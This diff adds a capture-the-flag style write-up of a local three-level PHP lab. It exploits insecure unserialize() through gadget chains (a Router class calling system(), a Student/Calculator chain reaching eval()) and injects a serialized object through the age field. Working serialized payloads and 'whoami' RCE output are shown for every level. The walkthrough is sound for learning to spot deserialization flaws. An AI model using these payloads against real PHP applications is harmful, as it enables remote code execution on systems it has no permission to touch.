@@ -1,0 +1,484 @@
+
+
+  [-Prerequisites-]
+	
+			
+			=> Lets take an overview of this lab.
+			We have a form that can be entered student info, i typed:
+			
+			------------
+			name: truong
+			age: 18
+			------------
+			
+			Click the insert button, we have	
+			
+	[localhost:25001]
+	
+	 		-----------------------------
+			# 	Name 	Age 	Point
+			0	truong	18	N/A
+			-----------------------------
+			
+			=> Click the save button, we have a .sav file (storing the saved data)
+			
+	[student.sav]
+			
+			------------------------------------------------------------------------------
+			0|O:7:"Student":3:{s:4:"name";s:7:"truong4";s:3:"age";s:2:"18";s:4:"exam";N;}|
+			------------------------------------------------------------------------------
+			
+			[!] This string seems like the PHP serialized data, which first "0" is the object number 0,
+			This represents an object of class "Student" with three properties: "name", "age", and "exam". Each property is represented by a string preceded by its length,
+			followed by the corresponding value.
+					
+		
+  [-Exploitation-]
+	
+	
+		  
+		      
+		      ---------------level 1----------------
+		      |                                    |
+		      |          localhost:25001           |
+		      |                                    |
+		      --------------------------------------
+		      
+		      So we all know what the lab does, lets check the backend
+		      
+	[index.php]
+	
+			--------------------------------------------
+			<?php
+			require('vendor/autoload.php');
+			foreach (glob("libs/*.php") as $filename) {
+			    include($filename);					         // Include all PHP files in libs directory
+			}
+
+			session_start();
+
+			if (!isset($_SESSION["students"]))
+			    $_SESSION["students"] = array();
+
+			if (isset($_POST["name"]) && isset($_POST["age"])) {
+			    $student = new Student($_POST["name"], $_POST["age"]);	// create new object $student of class Student
+			    array_push($_SESSION["students"], $student);
+			}
+
+			include("save-load.php");
+			?>
+
+			...
+			.....
+			---------------------------------------------
+		    
+	[save-load.php]
+	
+			---------------------------------------------------------------------
+			case 'save':
+			    $message = "";
+			    foreach ($_SESSION["students"] as $key => $student)
+				$message = $message . $key . "|" . serialize($student) . "|";   	// iterate each student and save by the format |KEY1|VALUE1|1|KEY2|VALUE2|...
+		
+			    header('Content-Type: application/octet-stream');
+			    header("Content-disposition: attachment; filename=students.sav");
+			    header("Content-Length: " . strlen($message));				// Save file in .sav format
+			    echo $message;
+			    die();
+			    break;
+			case 'load':
+			    $data = file_get_contents($_FILES["data"]["tmp_name"]);             	// Get loaded file from input
+			    $students_data = explode("|", $data);					// Break the data into a new array [0] => KEY1, [1] => VALUE1, 
+			    														   [2] => KEY2, [3] => VALUE2, ....
+			    $students = array();
+			    for ($idx = 0; $idx < count($students_data); $idx = $idx + 2) {
+				$key = $students_data[$idx];						// $key = KEY1 ($idx = 0), new iteration: $key = KEY2 ($idx = 2)				  
+				$value = $students_data[$idx + 1];					// $value = VALUE1 ($idx = 1), ....
+				$value = unserialize($value);						// deserialize data
+				$students[$key] = $value;						// Store info after deserialization into new array
+				$_SESSION["students"] = $students;					
+			    }
+			-----------------------------------------------------------------------		      
+		 
+		 
+		 So we know the backend, BUT "index.php" include all PHP files inside folder "libs"
+		 This folder contains all classes that created by developer, take a look around then i see something "vulnerable"/
+		
+	[libs/router.php]
+	
+			----------------------------------------------
+			<?php
+			class Router
+			{
+			    public $host;
+
+			    public function __construct($host)
+			    {
+				$this->host = $host;
+			    }
+
+			    public function __toString()
+			    {
+				return system("ping " . $this->host);		
+			    }
+			}
+			-------------------------------------------------
+			
+	
+		[!] The __toString method is called whenever an object is treated like a string.
+		=> Then when __toString invoked, the "system()" command will be executed!
+		
+		===> So i write a simple file test PHP to generate a serialized data that will be deserialize by server
+		
+		
+		
+	[test.php]
+	
+			----------------------------------------------
+			<?php
+			class Router
+			{
+			    public $host;
+
+			    public function __construct($host)
+			    {
+				$this->host = $host;
+			    }
+
+			    public function __toString()
+			    {
+				return system("ping " . $this->host);
+			    }
+			}
+
+			$obj = new Router(";whoami");
+			echo serialize($obj);
+			-----------------------------------------------
+			
+		=> OUTPUT: O:6:"Router":1:{s:4:"host";s:7:";whoami";}
+		
+		
+		[!] But, we need to modify the payload for appropriate with the backend (KEY1|VALUE1...)
+		
+		
+		
+	[payload.sav]
+	
+			---------------------------------------------
+			0|O:6:"Router":1:{s:4:"host";s:7:";whoami";}|
+		      	---------------------------------------------
+		      
+		      
+		
+		[!] I think i need to explain more specifically
+		
+	[table.php]
+			----------------------------------------------------
+			foreach ($_SESSION["students"] as $idx => $student)
+		        echo <<<EOF
+		            <tr>
+		                <th scope="row">{$idx}</th>{$student}
+		            </tr>
+		        EOF;
+			----------------------------------------------------
+			
+			
+		=> My payload => deserialized by server => stored in $_SESSION["students"] => table.php echo my payload to screen => __toString invoked => system(ping;whoami) => EXPLOITED!
+		
+		
+	[Final result: RCE]
+	[localhost:25001/index.php]
+			
+			-----------------
+			www-data www-data 
+			-----------------
+			
+		=> EXPLOITED!
+			
+			
+		      ---------------level 2----------------
+		      |                                    |
+		      |          localhost:25002           |
+		      |                                    |
+		      --------------------------------------
+		      
+		 There are nothing too different from the previous level, BUT
+		      
+	[index.php]
+			---------------------------------------------
+			...
+			.....
+			foreach (glob("libs/*.php") as $filename) {
+			    // Không include file router.php
+			    if ($filename !== "libs/router.php")
+				include($filename);
+			}
+			.....
+			...
+			---------------------------------------------
+		      
+		      
+		You can see that, router.php is not function anymore, but there are still another way
+		
+	[utils.php]
+	
+			------------------------------------------
+			class Calculator
+			{
+			    public $expression;
+			    public function __construct($expr)
+			    {
+				$this->expression = $expr;
+			    }
+
+			    public function get_result()
+			    {
+				$result = eval($this->expression);
+				return $result;
+			    }
+			}
+		      	-------------------------------------------
+		      	
+		We see that vulnerable "eval()" which is evaluate and execute all PHP inside it, but to using it, we need to invoke the method get_result(),
+		seems impossible, BUT:
+		
+		
+		
+	[student.php]
+	
+			----------------------------------------------
+		      	<?php
+			include_once("exam.php");
+			class Student
+			{
+
+			    public $name;
+			    public $age;
+			    public $exam;
+			    public function __construct($name, $age)
+			    {
+				$this->name = $name;
+				$this->age = $age;
+			    }
+
+			    public function __toString()
+			    {
+				return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>";
+			    }
+
+			    public function join($exam)
+			    {
+				$this->exam = $exam;
+			    }
+
+			    public function test()
+			    {
+				$this->exam->test();
+			    }
+
+			    public function get_point()
+			    {
+				if (isset($this->exam))
+				    return $this->exam->get_result();
+				return "N/A";
+			    }
+			}
+			--------------------------------------------------
+			
+		See it? We both have "__toString()" and "get_result()" (CBJS intent to do it)
+		
+		=> So here is the flow of my mindset:
+		
+		[!] Create an instance of Student class  ->  invoke join() with attribute $exam is the instance of Calculator class  
+							 ->  So when tables.php echo the deserialized data to screen
+							 ->  __toString invoked
+							 ->  get_point() invoked
+							 ->  get_result() invoked 
+							 ->  eval() invoked 
+							 ->  RCE!
+							 
+		So here is my payload, the same method to create a serialized paload
+		
+		
+	[test.php]
+		
+			------------------------------------------------------------
+			<?php
+			include_once("exam.php");
+			class Student
+			{
+
+			    public $name;
+			    public $age;
+			    public $exam;
+			    public function __construct($name, $age)
+			    {
+				$this->name = $name;
+				$this->age = $age;
+			    }
+
+			    public function __toString()
+			    {
+				return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>";
+			    }
+
+			    public function join($exam)
+			    {
+				$this->exam = $exam;
+			    }
+
+			    public function test()
+			    {
+				$this->exam->test();
+			    }
+
+			    public function get_point()
+			    {
+				if (isset($this->exam))
+				    return $this->exam->get_result();
+				return "N/A";
+			    }
+			}
+
+			class Calculator
+			{
+			    public $expression;
+			    public function __construct($expr)
+			    {
+				$this->expression = $expr;
+			    }
+
+			    public function get_result()
+			    {
+				$result = eval($this->expression);
+				return $result;
+			    }
+			}
+
+			$student = new Student("truong", "18");
+			$payload = new Calculator("system('whoami');");
+			$student->join($payload);
+			echo serialize($student);
+			-----------------------------------------------------------------
+			
+		=> OUTPUT: O:7:"Student":3:{s:4:"name";s:6:"truong";s:3:"age";s:2:"18";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}
+		=> PAYLOAD: 0|O:7:"Student":3:{s:4:"name";s:6:"truong";s:3:"age";s:2:"18";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|
+		
+		
+	[localhost:25002/index.php]
+	
+			 www-data 
+				 
+		=> EXPLOITED!
+
+				
+		      ---------------level 3----------------
+		      |                                    |
+		      |          localhost:25003           |
+		      |                                    |
+		      --------------------------------------
+		      
+		      So, this time we cant input the .sav file from external
+		      The server save the file inside their backend /usr/save-files
+		      
+		      
+	[safe-save-load.php]
+	
+				-----------------------------------------------------------------
+				?php
+				case 'save';
+				    ...
+				    ...
+				    file_put_contents("/usr/save_files/" . session_id(), $message);
+				    ...
+				    ...
+				case 'load':
+				    $data = file_get_contents("/usr/save_files/" . session_id());
+				    ...
+				    ...
+				    }
+				-----------------------------------------------------------------
+				
+			Server saves file then put in /usr/save_files/ and take there to load
+			So we only have untrusted data is the "name" and "age"
+			
+			[!] => So the mindset: We input the payload, so when it load itself, the payload concatinate together => RCE!
+		
+			The sanitization of back-end seems no changes => We base on previous payload
+			
+	[Payload]
+	
+				--------------------------------------------------------------------------------------------------------------------------------------------
+				0|O:7:"Student":3:{s:4:"name";s:6:"truong";s:3:"age";s:2:"18";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|
+	
+			I choose "age" to perform the payload
+			
+									where age input----
+									 		  ||
+											  \/	
+				0|O:7:"Student":3:{s:4:"name";s:6:"truong";s:3:"age";s:2:"18";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|
+			
+			Because the ":s:2:" before input will count the number of character => The first object is cannot perform the payload
+			
+			=> We type the first object randomly, then second one is our payload and the last is random.
+			
+			
+				
+				
+		      		name: truong
+		      		age: |1|O:7:"Student":3:{s:4:"name";s:6:"truong";s:3:"age";s:2:"18";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|     2|abc123
+		      		
+		      		      ----------------------------------------------------------  --------------------------------------------------------------------------------     ---  ----
+		      		     				     	                        \/			                						  \/		
+		      		     				     	                        
+		      				                   			Second obj: payload                            						 last obj: redundant
+		      
+		      
+		      => Final payload:
+		      
+		      	---------------------------------------------------------------------------
+		      	name: truong 
+		      	age: |1|O:7:"Student":3:{s:4:"name";s:6:"truong";s:3:"age";s:2:"18";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|2|abc123
+		 	     
+		      
+		      
+	[localhost:25003]
+	
+				www-data
+				# 	Name 	Age 	Point
+				0
+				1	truong	18	
+				2
+		      
+		      => EXPLOITED!
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
+		      
